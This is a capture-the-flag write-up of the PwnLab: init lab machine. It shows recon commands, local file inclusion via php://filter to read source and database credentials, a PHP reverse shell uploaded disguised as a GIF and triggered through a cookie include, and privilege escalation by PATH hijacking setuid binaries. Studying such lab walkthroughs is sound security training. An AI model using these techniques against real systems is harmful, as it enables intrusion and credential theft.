---
layout: post
title: "pwnlab_init"
date: 2016-09-11 09:07:37 -0500
comments: true
categories: [LFI]
---

##Tools:

* netdiscover
* Nmap
* DirBuster
* Burp




<!--more-->
Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.50.0/24`

{% img  /images/blog/vulhub/pwnlab_init/Selection_001.png   [title manually exploit [alt text]] %}

192.168.50.131 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.50.131 -p-`

{% img  /images/blog/vulhub/pwnlab_init/Selection_002.png   [title manually exploit [alt text]] %}

port 80 is opening.

use nikto to scan

`nikto -h 192.168.50.131`

{% img  /images/blog/vulhub/pwnlab_init/Selection_003.png   [title manually exploit [alt text]] %}

use dirbuster to get all dirs and files

{% img  /images/blog/vulhub/pwnlab_init/Selection_004.png   [title manually exploit [alt text]] %}

check the page:

{% img  /images/blog/vulhub/pwnlab_init/Selection_005.png   [title manually exploit [alt text]] %}

use sqlmap

`sqlmap -u "http://192.168.50.131"  --forms --batch --crawl=10 --level=5 --risk=3 --random-agent --dbms=MySQL`

Nothing.


Check the page souce code,

{% img  /images/blog/vulhub/pwnlab_init/Selection_006.png   [title manually exploit [alt text]] %}

It seems there is a local file inclusion in `page` parmeter, based on [LFI](https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/)

`curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=config`

{% img  /images/blog/vulhub/pwnlab_init/Selection_007.png   [title manually exploit [alt text]] %}

get config.php' base64 encoded content

`echo PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+ | base64 --decode`

{% img  /images/blog/vulhub/pwnlab_init/Selection_008.png   [title manually exploit [alt text]] %}


get mysql username/password

connect mysql database:

`mysql -h 192.168.50.131 -u root -pH4u%QJ_H99`

show databases:

`mysql> show databases;`

{% img  /images/blog/vulhub/pwnlab_init/Selection_009.png   [title manually exploit [alt text]] %}


```
mysql> show tables;
mysql> use Users;
mysql> select * from users;
```

{% img  /images/blog/vulhub/pwnlab_init/Selection_010.png   [title manually exploit [alt text]] %}

these passwords are base64 encoded

```
kent | JWzXuBJJNy
mike | SIfdsTEn6I
kane | iSv5Ym2GRo
```

login as kane

{% img  /images/blog/vulhub/pwnlab_init/Selection_011.png   [title manually exploit [alt text]] %}

try to upload webshell, failed. only accept image.

{% img  /images/blog/vulhub/pwnlab_init/Selection_012.png   [title manually exploit [alt text]] %}

in order to find out which file extension do i need

I will get upload.php code

`curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=upload`

{% img  /images/blog/vulhub/pwnlab_init/Selection_013.png   [title manually exploit [alt text]] %}

decode the content

```php
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}
```

so image extensions are `$whitelist = array(".jpg",".jpeg",".gif",".png");`

copy a php reverse shell into a gif file, use burp add `GIF`


{% img  /images/blog/vulhub/pwnlab_init/Selection_014.png   [title manually exploit [alt text]] %}

then the php shell is uploaded

{% img  /images/blog/vulhub/pwnlab_init/Selection_015.png   [title manually exploit [alt text]] %}


now need to find out how to trigger the shell

check index.php

`curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=index`

```php
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
	include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
	if (isset($_GET['page']))
	{
		include($_GET['page'].".php");
	}
	else
	{
		echo "Use this server to upload and share image files inside the intranet";
	}
?>
</center>
</body>
</html>
```
find out cookie also have LFI.


first verify the LFI

{% img  /images/blog/vulhub/pwnlab_init/Selection_016.png   [title manually exploit [alt text]] %}


{% img  /images/blog/vulhub/pwnlab_init/Selection_017.png   [title manually exploit [alt text]] %}

now setup netcat on port 443


{% img  /images/blog/vulhub/pwnlab_init/Selection_018.png   [title manually exploit [alt text]] %}

get the shell

{% img  /images/blog/vulhub/pwnlab_init/Selection_019.png   [title manually exploit [alt text]] %}

login in as kane

`su kane`

find an interesting file msgmike


`ls -alh msgmike`

its seuid is set.

try to run it 

`./msgmike`

shows `cat: /home/mike/msg.txt: No such file or directory`


try to escape it

```
export PATH=.:$PATH
echo "/bin/bash" > cat
chmod +x cat
./msgmike
```
now escape to user mike.

Find another program's setuid is on

{% img  /images/blog/vulhub/pwnlab_init/Selection_020.png   [title manually exploit [alt text]] %}

run `msg2root`

`Message for root:`

upload [setuid.c](https://github.com/wg135/script/blob/master/suid.c), compiled.

run msg2root, get root

{% img  /images/blog/vulhub/pwnlab_init/Selection_021.png   [title manually exploit [alt text]] %}




